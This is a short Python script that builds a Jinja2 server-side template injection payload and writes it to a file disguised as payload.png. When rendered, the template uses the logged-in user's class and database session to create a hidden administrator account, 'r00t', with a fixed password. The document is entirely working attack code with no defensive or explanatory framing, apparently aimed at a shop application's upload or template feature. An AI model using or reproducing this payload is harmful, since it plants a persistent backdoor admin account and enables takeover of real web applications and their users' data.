# build_payload.py
payload = """\
{%- if current_user -%}
    {%- set _uc      = current_user.__class__ -%}
    {%- set _session = _uc.query.session -%}
    {%- if not _uc.query.filter_by(username='r00t').first() -%}
        {%- set _u = _uc() -%}
        {%- set _ = _u.__setattr__('shop_id',  current_user.shop_id) -%}
        {%- set _ = _u.__setattr__('username', 'r00t') -%}
        {%- set _ = _u.__setattr__('email',    'r00t@r00t.com') -%}
        {%- set _ = _u.__setattr__('role',     'admin') -%}
        {%- set _ = _u.set_password('r00t1234', 'weak') -%}
        {%- set _ = _session.add(_u) -%}
        {%- set _ = _session.commit() -%}
    {%- endif -%}
{%- endif -%}
"""

with open("payload.png", "w", encoding="utf-8") as f:
    f.write(payload)